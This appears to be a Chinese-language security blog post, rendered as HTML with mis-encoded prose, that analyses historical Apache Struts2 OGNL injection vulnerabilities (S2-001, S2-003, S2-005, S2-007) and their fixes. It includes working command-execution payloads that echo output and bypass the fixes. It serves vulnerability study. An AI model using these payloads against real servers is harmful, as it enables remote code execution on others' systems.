<h1 id="0x02-å†å²ç‰ˆæœ¬å›é¡¾"><a href="#0x02-å†å²ç‰ˆæœ¬å›é¡¾" class="headerlink" title="0x02 å†å²ç‰ˆæœ¬å›é¡¾"></a>0x02 å†å²ç‰ˆæœ¬å›é¡¾</h1><hr>
<h2 id="1-S2-001"><a href="#1-S2-001" class="headerlink" title="1. S2-001"></a>1. <a href="https://cwiki.apache.org/confluence/display/WW/S2-001" target="_blank" rel="noopener">S2-001</a></h2><p>å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/2044" target="_blank" rel="noopener">https://xz.aliyun.com/t/2044</a></p>
<p>æ¼æ´äº§ç”ŸåŸå› åœ¨äºï¼šç”¨<code>&lt;s:textfield&gt;</code>æ ‡ç­¾ï¼ŒåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥æ—¶ï¼Œä¼šè¿‡ä¸€æ¬¡OGNLè¡¨è¾¾å¼çš„è§£ææ‰§è¡Œã€‚æ¯”å¦‚åœºæ™¯ç™»é™†çš„åœ°æ–¹ï¼Œç”¨æˆ·åå¯†ç æ ¡éªŒé”™è¯¯ï¼Œä¸è·³è½¬é¡µé¢ï¼Œç›´æ¥å°†ç”¨æˆ·åå’Œå¯†ç æ”¾åˆ°é¡µé¢è§£æåè¿”å›ã€‚</p>
<p>source: ä½¿ç”¨äº†<code>s:textfield</code>æ ‡ç­¾ç”¨äºè¡¨å•ç”Ÿæˆï¼Œå½“ç”¨æˆ·è¾“å…¥ä¸åˆæ³•æ—¶ï¼Œå°†ç”¨æˆ·çš„è¾“å…¥å†…å®¹æ¸²æŸ“åˆ°è¿”å›çš„é¡µé¢ä¸Š</p>
<p>sink: jspæ¸²æŸ“è°ƒç”¨<code>doEndTag</code>ï¼Œåç»­ç”±äºè¯†åˆ«å‡ºç”¨æˆ·è¾“å…¥ä¸­OGNLè¡¨è¾¾å¼è€Œè°ƒç”¨<code>Ognl.getValue</code></p>
<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>ä¸»è¦å‡ºé—®é¢˜çš„æ˜¯JSPä¸­<code>&lt;s:textfield&gt;</code>æ ‡ç­¾ï¼ŒStruts2é‡Œå¤„ç†textfieldçš„æ˜¯<code>org.apache.struts2.components.UIBean</code></p>
<p><img src="/assets/talk_about_struts2/image-20200428211153680.png" alt="image-20200428211153680"></p>
<p><img src="/assets/talk_about_struts2/image-20200428212308880.png" alt="image-20200428212308880"></p>
<p>çœ‹åˆ°åœ¨å¤„ç†paramsæ—¶ï¼Œå½“parametersé‡Œä¸å­˜åœ¨<code>value</code>è¿™ä¸ªkeyçš„æ—¶å€™ï¼Œä¼šè¿›åˆ°æ‰§è¡Œnameç›¸å¯¹åº”çš„valueä¸Šæ¥ã€‚å¹¶ä¸”<code>altSyntax</code>é»˜è®¤é…ç½®ä¸º<code>true</code></p>
<p><img src="/assets/talk_about_struts2/image-20200428213206168.png" alt="image-20200428213206168"></p>
<p>ä¼šåœ¨å½“å‰çš„<code>name</code>å·¦å³åŠ ä¸ŠOGNLè¡¨è¾¾å¼çš„æ ‡è¯†<code>%{name}</code>ï¼Œè¿™é‡Œçš„nameæ˜¯<code>&lt;s:textfield name=&quot;name&quot;</code>ï¼Œnameå­—æ®µçš„å€¼ï¼Œæ¯”å¦‚è¿™é‡Œ<code>name=&quot;username&quot;</code>ï¼Œæ­¤æ—¶ä¼šå˜æˆ<code>%{username}</code>.ç»§ç»­å¾€ä¸‹è·Ÿ</p>
<p><img src="/assets/talk_about_struts2/image-20200428220429903.png" alt="image-20200428220429903"></p>
<p><img src="/assets/talk_about_struts2/image-20200428220447992.png" alt="image-20200428220447992"></p>
<p>è¿™é‡Œçš„Stringç±»å‹çš„è½¬åŒ–ä¸»è¦ç”¨äº†<code>TextParesUtil.translateVariables()</code>æ¥å¤„ç†ï¼Œè¿™é‡Œçœ‹çœ‹å…·ä½“ä»–æ€ä¹ˆåšçš„</p>
<p><code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables#97</code></p>
<p><img src="/assets/talk_about_struts2/image-20200428221026617.png" alt="image-20200428221026617"></p>
<p>è¿™é‡Œä¼šå»åˆ¤æ–­ä¼ å…¥çš„expressionæ˜¯å¦æ˜¯OGNLè¡¨è¾¾å¼çš„æ ¼å¼çš„<code>%{xxx}</code>ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±ä¼šå»<code>OgnlValueStack</code>é‡Œé¢å»æ‰¾å¯¹åº”çš„å†…å®¹(è¿™å—å°±æ˜¯OGNLè¡¨è¾¾å¼çš„è®¡ç®—ç»“æœï¼Œ<code>findValue</code>å‡½æ•°åç»­ä¼šå»è°ƒç”¨<code>OgnlUtil.getValue</code>ï¼Œè¯¦ç»†çš„å¯ä»¥çœ‹æˆ‘åŸºç¡€é‡Œåˆ—çš„æ–‡ç« )</p>
<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç¬¬ä¸€éä¼ å…¥çš„<code>%{name}</code>ä¼šè§£æè·å¾—å¯¹åº”çš„å€¼<code>%{@java.lang.Runtime.....}</code></p>
<p>ç¬¬äºŒéä¼šå»è§£æ<code>%{@java.lang.Runtime....}</code>ï¼Œè¿™é‡Œæ‰§è¡Œäº†æˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p>
<h3 id="å›æ˜¾POC"><a href="#å›æ˜¾POC" class="headerlink" title="å›æ˜¾POC"></a>å›æ˜¾POC</h3><p>å‰é¢ç®€å•ç”¨äº†OGNLè¡¨è¾¾å¼è°ƒç”¨é™æ€æ–¹æ³•çš„å½¢å¼æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<code>@java.lang.Runtime@getRuntime().exec(command)</code></p>
<p>è¿™é‡ŒS2-001å…¶å®æ˜¯ä¼šç›´æ¥å›æ˜¾çš„ï¼Œå°†æ›¿æ¢åŸæœ‰çš„inputæ ‡ç­¾çš„å†…å®¹ï¼Œè¿™é‡Œæ¢ä¸€ç§æ–¹å¼æ¥è¿›è¡Œå›æ˜¾ï¼Œåˆ©ç”¨Struts2çš„HttpServletResponseæ¥å†™å…¥å†…å®¹ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(xxxxxx),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br></pre></td></tr></table></figure>
<p>å…ˆä»ä¸Šä¸‹æ–‡contextä¸­å–å‡º<code>HttpServletResponse</code>çš„å®ä¾‹ï¼Œç”¨åˆ°çš„å®é™…æ˜¯<code>HttpServletResponseWrapper</code></p>
<p><img src="/assets/talk_about_struts2/image-20200428223750035.png" alt="image-20200428223750035"></p>
<p>ç„¶åè·å–å½“å‰responseçš„writerå¯¹è±¡ï¼Œåœ¨åˆ©ç”¨è¯¥writeræ¥å†™å…¥ä»»æ„å†…å®¹</p>
<p>æ¯”å¦‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#writer.println(&quot;wh1t3p1g&quot;),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶ä½ ä¹Ÿå¯ä»¥æ›¿æ¢æˆæ‰§è¡Œå‘½ä»¤åçš„å†…å®¹</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),</span><br><span class="line">#is=#pb.getInputStream(),</span><br><span class="line">#isr=new InputStreamReader(#is),</span><br><span class="line">#br=new BufferedReader(#isr),</span><br><span class="line">#chars=new char[500],</span><br><span class="line">#br.read(#chars),</span><br><span class="line">#str=new java.lang.String(#chars),</span><br><span class="line">// ä¸Šé¢ä¸»è¦è·å–æ‰§è¡Œåçš„å†…å®¹ï¼Œä¸‹é¢ä¸»è¦åšå›æ˜¾æ“ä½œ</span><br><span class="line">#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#writer.println(#str),</span><br><span class="line">#writer.flush(),</span><br><span class="line">#writer.close()</span><br><span class="line"></span><br><span class="line">%&#123;#pb=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#is=#pb.getInputStream(),#isr=new java.io.InputStreamReader(#is),#br=new java.io.BufferedReader(#isr),#chars=new char[500],#br.read(#chars),#str=new java.lang.String(#chars),#writer=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(), #writer.println(#str),#writer.flush(),#writer.close()&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>åœ¨&gt;=2.0.9ç‰ˆæœ¬çš„struts2ä¸Šï¼Œ<code>com.opensymphony.xwork2.util.TextParseUtil#translateVariables</code>åšäº†å¾ªç¯åˆ¤æ–­ï¼Œä¸å…è®¸é€’å½’æ‰§è¡ŒOGNLè¡¨è¾¾å¼</p>
<p><img src="/assets/talk_about_struts2/image-20200428231900257.png" alt="image-20200428231900257"></p>
<p>é»˜è®¤<code>maxLoopCount</code>ä¸º1ï¼Œæ‰€ä»¥å¤„ç†å®Œ<code>%{name}</code>åï¼Œä¸ä¼šå†ç»§ç»­å¯¹ä»–çš„å€¼è¿›è¡ŒOGNLè¡¨è¾¾å¼çš„æ‰§è¡Œäº†ã€‚</p>
<h2 id="2-S2-003"><a href="#2-S2-003" class="headerlink" title="2. S2-003"></a>2. <a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">S2-003</a></h2><p>å½±å“èŒƒå›´ï¼š2.0.0 - 2.0.11.2</p>
<p>çœ‹å®˜ç½‘çš„ä»‹ç»ï¼Œé—®é¢˜å‡ºåœ¨<code>ParametersInterceptor</code>ï¼Œå‰é¢åˆ©ç”¨äº†<code>Ognl.getValue</code>æ¥è®¡ç®—OGNLè¡¨è¾¾å¼ï¼Œè€ŒS2-003ç”¨çš„åˆ™æ˜¯<code>Ognl.setValue</code>ï¼Œè¯¥å‡½æ•°ä¹ŸåŒæ ·å¯ä»¥è®¡ç®—OGNLè¡¨è¾¾å¼</p>
<p>source: å‚æ•°çš„keyï¼Œä½¿ç”¨unicodeç¼–ç ç»•è¿‡<code>#</code>çš„æ£€æµ‹</p>
<p>sink: è°ƒç”¨<code>Ognl.setValue</code></p>
<h3 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>Struts2åœ¨å¤„ç†å‚æ•°å†…å®¹æ—¶ï¼Œå°†è°ƒç”¨<code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>å‡½æ•°ï¼Œå¡«å……åˆ°OgnlVauleStackçš„contextä¸Šä¸‹æ–‡é‡Œã€‚</p>
<p><img src="/assets/talk_about_struts2/image-20200430155156109.png" alt="image-20200430155156109"></p>
<p>è¿™é‡Œä¼šå…ˆè¿‡ä¸€æ¬¡<code>acceptableName</code>çš„æ£€æŸ¥ï¼ˆ2.0.8ç‰ˆæœ¬ï¼‰</p>
<p><img src="/assets/talk_about_struts2/image-20200430155231489.png" alt="image-20200430155231489"></p>
<p>ä¸èƒ½å‡ºç°<code>=</code>ã€<code>,</code>ã€<code>#</code>ã€<code>:</code>ä»¥åŠè¢«æ’é™¤åœ¨å¤–çš„å‚æ•°å</p>
<p><img src="/assets/talk_about_struts2/image-20200430155418664.png" alt="image-20200430155418664"></p>
<p>åªæœ‰é€šè¿‡äº†acceptableNameå‡½æ•°çš„æ£€æŸ¥æ‰èƒ½ç»§ç»­å¾€ä¸‹èµ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»ç»•è¿‡ä¸Šé¢çš„å‡ ä¸ªé—®é¢˜ï¼Œè¿™é‡Œæ¼æ´å‘ç°è€…ç”¨äº†unicodeç¼–ç æ¥ç»•è¿‡æ£€æµ‹ã€‚</p>
<p><code>ognl.JavaCharStream#readChar</code></p>
<p><img src="/assets/talk_about_struts2/image-20200430232206989.png" alt="image-20200430232206989"></p>
<p>å½“é‡åˆ°<code>\u</code>unicodeç¼–ç ï¼Œä¼šåšä¸€æ¬¡è½¬æ¢ï¼Œæ¯”å¦‚<code>\u0040</code>ä¼šè¢«è½¬æˆ<code>@</code></p>
<p>è€Œ<code>acceptableName</code>å‡½æ•°å¹¶æ²¡æœ‰è€ƒè™‘unicodeç¼–ç çš„æ–¹å¼ï¼Œå¯¼è‡´å…¶å½¢åŒè™šè®¾ã€‚</p>
<p>å›åˆ°<code>setParameters</code>ï¼Œåç»­è°ƒç”¨äº†<code>OgnlValueStack.setValue</code></p>
<p><img src="/assets/talk_about_struts2/image-20200430232635455.png" alt="image-20200430232635455"></p>
<p>è¿™é‡Œæœ€ç»ˆåˆ°äº†<code>OgnlUtil.setValue</code>è®¡ç®—OGNLè¡¨è¾¾å¼</p>
<h3 id="POCåˆ†æ"><a href="#POCåˆ†æ" class="headerlink" title="POCåˆ†æ"></a>POCåˆ†æ</h3><p>æ¥çœ‹ä¸€ä¸ªè°ƒç”¨å‘½ä»¤æ‰§è¡Œçš„POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;(<span class="string">'\u0040java.lang.Runtime@getRuntime().exec(\'open /System/Applications/Calculator.app\')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure>
<p>å…ˆæ¥çœ‹ç¬¬ä¸€å¥ï¼Œè¯¥æ¡ognlè¡¨è¾¾å¼ç”¨äºå¼€å¯æ–¹æ³•æ‰§è¡Œï¼Œå› ä¸ºåœ¨è°ƒç”¨<code>setParameters</code>ä¹‹å‰ï¼Œå¼€å‘äººå‘˜è€ƒè™‘åˆ°äº†å‚æ•°æ‰§è¡ŒOGNLè¡¨è¾¾å¼çš„é£é™©ï¼Œæ‰€ä»¥æå‰å…³é—­äº†å‡½æ•°è°ƒç”¨æ‰§è¡Œ</p>
<p><img src="/assets/talk_about_struts2/image-20200430234629782.png" alt="image-20200430234629782"></p>
<p>è®¾ç½®å®Œäº†ä¹‹åï¼Œå†è¿˜åŸå›æ¥</p>
<p>ä½†æ˜¯OGNLè¡¨è¾¾å¼å¯¹äºä¸Šä¸‹æ–‡çš„å†…å®¹æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨å‰ï¼Œå°†contexté‡Œçš„<code>xwork.MethodAccessor.denyMethodExecution</code>è®¾ä¸º<code>false</code>ï¼Œ è¿™æ ·ç¬¬äºŒå¥pocå°±å¯ä»¥æ‰§è¡Œå‡½æ•°è°ƒç”¨äº†ã€‚</p>
<p>æ‰€ä»¥åœ¨å‘é€è¿™ä¸¤æ¡POCæ—¶ï¼Œéœ€è¦æ§åˆ¶å¥½è®¾ç½®falseåœ¨å‰ï¼Œæ‰§è¡Œåœ¨åï¼ˆasciiæ’åºï¼Œå¯ä»¥çœ‹å›æ˜¾pocçš„å¤„ç†ï¼‰</p>
<p>è·Ÿå‰é¢ä¸€æ ·ï¼Œå†™ä¸€ä¸‹å›æ˜¾çš„POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(a)((<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla))</span><br><span class="line">(b)((<span class="string">'\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')'</span>)(bla))&amp; <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">(c)((<span class="string">'\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())'</span>)(bla))&amp;</span><br><span class="line">(d)((<span class="string">'\u0023res\u003dnew\u0020byte[2000]'</span>)(bla))&amp;</span><br><span class="line">(e)((<span class="string">'\u0023dis.readFully(\u0023res)'</span>)(bla))&amp;</span><br><span class="line">(f)((<span class="string">'\u0023writer\u003d\u0023context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\').getWriter()'</span>)(bla))&amp;</span><br><span class="line">(g)((<span class="string">'\u0023writer.println(new\u0020java.lang.String(\u0023res))'</span>)(bla))&amp; <span class="comment">// è·å–responseï¼Œå›æ˜¾æ•°æ®</span></span><br><span class="line">(h)((<span class="string">'\u0023writer.flush()'</span>)(bla))&amp;</span><br><span class="line">(i)((<span class="string">'\u0023writer.close()'</span>)(bla))</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œpocçš„å…ˆåé¡ºåºç”¨åˆ°äº†ç¬¬ä¸€ä¸ªä½ç½®ï¼Œå®é™…çš„ognlè¡¨è¾¾å¼æ”¾åˆ°äº†ç¬¬äºŒä¸ªä½ç½®<code>(1)((2)(3))</code></p>
<h3 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>xwork&gt;=2.0.6 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>å¤šäº†ä»¥ä¸‹ä»£ç </p>
<p><img src="/assets/talk_about_struts2/image-20200507101610804.png" alt="image-20200507101610804"></p>
<p>ä½ç‰ˆæœ¬ç”¨çš„ç›´æ¥æ˜¯å·²å­˜åœ¨çš„OgnlValueStackï¼Œä»2.0.6å¼€å§‹ï¼Œä½¿ç”¨äº†ä¸€ä¸ªç©ºçš„stackæ¥å¤„ç†å‚æ•°çš„è§£æ</p>
<p>å¹¶ä¸”ä»è¿™ä¸ªç‰ˆæœ¬å¼€å§‹å¤šäº†SecurityMemberAccessï¼Œç”¨æ¥é™åˆ¶ognlè¡¨è¾¾å¼ä¸­å‡½æ•°è°ƒç”¨</p>
<p>åœ¨<code>ognl.OgnlRuntime#callAppropriateMethod</code>è°ƒç”¨å‡½æ•°å‰ï¼Œä¼šå»åˆ¤æ–­å‡½æ•°æ˜¯å¦å¯è¢«è®¿é—®(methodä¸ä¸ºnull)</p>
<p><img src="/assets/talk_about_struts2/image-20200507102155210.png" alt="image-20200507102155210"></p>
<p>å…¶å®è¿™è¾¹<code>isMethodAccessible</code>çš„è¿”å›ç»“æœæ— æ‰€è°“ï¼Œä½†æ˜¯ä¸èƒ½åœ¨è¿™ä¸ªå‡½æ•°è°ƒç”¨æ—¶å‡ºé”™ï¼Œå‡ºé”™çš„è¯ä¹Ÿå°±èµ°ä¸åˆ°<code>invokeMethod</code></p>
<p>çœ‹ä¸€ä¸‹å…·ä½“çš„å®ç°ï¼Œ<code>isMethodAccessible</code>çš„åˆ¤æ–­ä¾èµ–äº<code>SecurityMemberAccess</code></p>
<p><img src="/assets/talk_about_struts2/image-20200507102334789.png" alt="image-20200507102334789"></p>
<p><img src="/assets/talk_about_struts2/image-20200507103428140.png" alt="image-20200507103428140"></p>
<p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹<code>isAcceptableProperty</code></p>
<p><img src="/assets/talk_about_struts2/image-20200507103621957.png" alt="image-20200507103621957"></p>
<p><img src="/assets/talk_about_struts2/image-20200507103632321.png" alt="image-20200507103632321"></p>
<p><img src="/assets/talk_about_struts2/image-20200507103642250.png" alt="image-20200507103642250"></p>
<p>ä¸‹ç«¯ç‚¹è°ƒè¯•ä½ ä¼šå‘ç°è¿™ä¸ªç‰ˆæœ¬acceptPropertiesä¸ºç©ºï¼Œè€ŒexcludePropertieséç©ºï¼Œæ‰€ä»¥åœ¨è°ƒç”¨<code>isExclude</code>å‡½æ•°æ—¶ï¼Œæ­£åˆ™è°ƒç”¨<code>pattern.matcher(null)</code>ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ— æ³•è¾¾åˆ°è°ƒç”¨å‡½æ•°çš„ç›®çš„äº†ï¼ˆ<code>propertiesName</code>ä¸ºnullï¼‰ã€‚</p>
<p>æ‰€ä»¥å¦‚æœè¦ç»•è¿‡è¿™ä¸ªç‰ˆæœ¬çš„é™åˆ¶ï¼Œé¦–å…ˆéœ€è¦è§£å†³çš„æ˜¯è¿™ä¸ªå‡½æ•°çš„æŠ¥é”™é—®é¢˜ï¼Œçœ‹S2-005</p>
<h2 id="3-S2-005"><a href="#3-S2-005" class="headerlink" title="3. S2-005"></a>3. <a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="noopener">S2-005</a></h2><p>å½±å“ç‰ˆæœ¬ï¼šstruts2.0.0 - 2.1.8.1</p>
<p>S2-005ä¸ºS2-003çš„ä¿®å¤ç»•è¿‡ï¼Œç›´æ¥åˆ†æPOC</p>
<h3 id="POCåˆ†æ-1"><a href="#POCåˆ†æ-1" class="headerlink" title="POCåˆ†æ"></a>POCåˆ†æ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(bla)(bla)&amp;</span><br><span class="line">(<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla)(bla)&amp;</span><br><span class="line">(<span class="string">'\u0040java.lang.Runtime@getRuntime().exec(\'open\u0020/System/Applications/Calculator.app\')'</span>)(bla)(bla)</span><br></pre></td></tr></table></figure>
<p>å‰é¢S2-003ä¿®å¤éƒ¨åˆ†è¯´åˆ°äº†éœ€è¦ç»•è¿‡<code>isAcceptableProperty</code>å‡½æ•°æŠ¥é”™çš„é—®é¢˜æ‰èƒ½ç»§ç»­å¾€ä¸‹è¿›è¡Œå‡½æ•°è°ƒç”¨ã€‚</p>
<p>ä»ä»£ç ä¸Šçœ‹ï¼Œåªè¦<code>excludeProperties</code>å’Œ<code>acceptProperties</code>ä¸ºç©ºï¼Œå°±ä¸ä¼šè¿›åˆ°æ­£åˆ™åŒ¹é…çš„ç¯èŠ‚ï¼Œæ‰€ä»¥éœ€è¦å°†ä»–ä»¬ç½®ä¸ºç©º</p>
<p>pocé‡Œçš„ç¬¬ä¸€è¡Œåšçš„å°±æ˜¯è¿™ä¸ªäº‹æƒ…ï¼Œå°†<code>excludeProperties</code>ç½®ä¸ºç©ºé›†åˆ</p>
<p>è¿™é‡Œçœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆä»¥<code>#_memberAccess</code>çš„æ–¹å¼å¯ä»¥è®¿é—®åˆ°<code>OgnlContext</code>å¯¹è±¡çš„<code>memberAccess</code>å±æ€§</p>
<p><code>ognl.OgnlContext#get</code></p>
<p><img src="/assets/talk_about_struts2/image-20200507110201209.png" alt="image-20200507110201209"></p>
<p>ä»<code>OgnlContext</code>ä¸Šä¸‹æ–‡è·å–å†…å®¹ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜¯å¦åœ¨<code>RESERVED_KEYS</code>é›†åˆé‡Œï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ç›¸åº”çš„è°ƒç”¨ä»–çš„gettersï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ä»å½“å‰çš„ä¸Šä¸‹æ–‡é‡Œå»æ‰¾è¿™ä¸ªkeyã€‚</p>
<p>æ‰€ä»¥<code>#_memeberAccess</code>å®é™…è·å–çš„æ˜¯<code>OgnlContext</code>çš„<code>memeberAccess</code>å±æ€§å†…å®¹</p>
<p>è¿˜æœ‰å‡ºç°å˜åŒ–çš„åœ°æ–¹ï¼Œç”±äºç°åœ¨contexté‡Œæ˜¯æ²¡æœ‰responseå¯¹è±¡å¯ä»¥è·å–çš„ï¼Œæ‰€ä»¥åœ¨å¤„ç†å›æ˜¾çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æ‰¾å¦å¤–çš„æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(a)((<span class="string">'\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET'</span>)(bla))&amp;</span><br><span class="line">(a)((<span class="string">'\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse'</span>)(bla))&amp;</span><br><span class="line">(b)((<span class="string">'\u0023ret\u003d@java.lang.Runtime@getRuntime().exec(\'id\')'</span>)(bla))&amp; <span class="comment">// æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">(c)((<span class="string">'\u0023dis\u003dnew\u0020java.io.DataInputStream(\u0023ret.getInputStream())'</span>)(bla))&amp;</span><br><span class="line">(d)((<span class="string">'\u0023res\u003dnew\u0020byte[2000]'</span>)(bla))&amp;</span><br><span class="line">(e)((<span class="string">'\u0023dis.readFully(\u0023res)'</span>)(bla))&amp;</span><br><span class="line">(f)((<span class="string">'\u0023writer\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()'</span>)(bla))&amp;</span><br><span class="line">(g)((<span class="string">'\u0023writer.println(new\u0020java.lang.String(\u0023res))'</span>)(bla))&amp; <span class="comment">// è·å–responseï¼Œå›æ˜¾æ•°æ®</span></span><br><span class="line">(h)((<span class="string">'\u0023writer.flush()'</span>)(bla))&amp;</span><br><span class="line">(i)((<span class="string">'\u0023writer.close()'</span>)(bla))</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä½¿ç”¨äº†<a href="mailto:`@org.apache.struts2.ServletActionContext" target="_blank" rel="noopener">`@org.apache.struts2.ServletActionContext</a>@getResponse()`é™æ€æ–¹æ³•æ¥è·å–response</p>
<h3 id="ä¿®å¤-2"><a href="#ä¿®å¤-2" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>xwork&gt;=2.2.1.1ï¼Œå¯¹å‚æ•°ååšäº†æ›´ä¸ºç»†è‡´çš„æ­£åˆ™æ£€æŸ¥<code>[a-zA-Z0-9\\.\\]\\[\\(\\)_&#39;\\s]+</code></p>
<h2 id="4-S2-007"><a href="#4-S2-007" class="headerlink" title="4. S2-007"></a>4. S2-007</h2><p>è¿™é‡Œè·ŸS2-008é‡Œé¢çš„ç¬¬ä¸€ä¸ªæ¼æ´ä¸€æ ·</p>
<p><code>com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept</code></p>
<p><img src="/assets/talk_about_struts2/image-20200509111903026.png" alt="image-20200509111903026"></p>
<p>valueä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼Œè¿‡äº†ä¸€æ¬¡getOverrideExpr</p>
<p><img src="/assets/talk_about_struts2/image-20200509111939166.png" alt="image-20200509111939166"></p>
<p>å¯¹æˆ‘ä»¬çš„è¾“å…¥å›´ä¸Šäº†å•å¼•å·ï¼Œè¿™é‡Œå¦‚æœæˆ‘ä»¬çš„payloadä¸º<code>&#39;+xxxx+&#39;</code>ï¼Œè¿™é‡Œçš„xxxxå°±é€ƒé€¸å‡ºæ¥äº†ï¼Œè€Œä¸å•å•æ˜¯å­—ç¬¦ä¸²äº†</p>
<p><img src="/assets/talk_about_struts2/image-20200509112218065.png" alt="image-20200509112218065"></p>
<p>åç»­å°†å¤„ç†å¥½çš„æ•°æ®æ”¾åˆ°äº†stackçš„overridesé‡Œé¢</p>
<p>è€Œå®é™…è§¦å‘çš„åœ°æ–¹è·ŸS2-001ä¸€æ ·ï¼Œæ˜¯åœ¨è§£æJSPçš„æ—¶å€™é€ æˆçš„</p>
<p><img src="/assets/talk_about_struts2/image-20200509114347567.png" alt="image-20200509114347567" style="zoom:50%;"></p>
<p>åœ¨<code>tryFIndValue</code>å‡½æ•°ä¸­ï¼Œä»stackçš„overridesä¸­å–å‡ºå‰é¢åŠ äº†å•å¼•å·çš„æ•°æ®ï¼Œå¹¶åœ¨åç»­è°ƒç”¨<code>Ognl.getValue</code>ï¼Œå¯¼è‡´äº†Ognlè¡¨è¾¾å¼çš„æ‰§è¡Œã€‚</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'+ (#_memberAccess.allowStaticMethodAccess=true,#context['</span>xwork.MethodAccessor.denyMethodExecution<span class="string">']=false,@java.lang.Runtime@getRuntime().exec('</span>open /System/Applications/Calculator.app<span class="string">')) +'</span></span><br></pre></td></tr></table></figure>
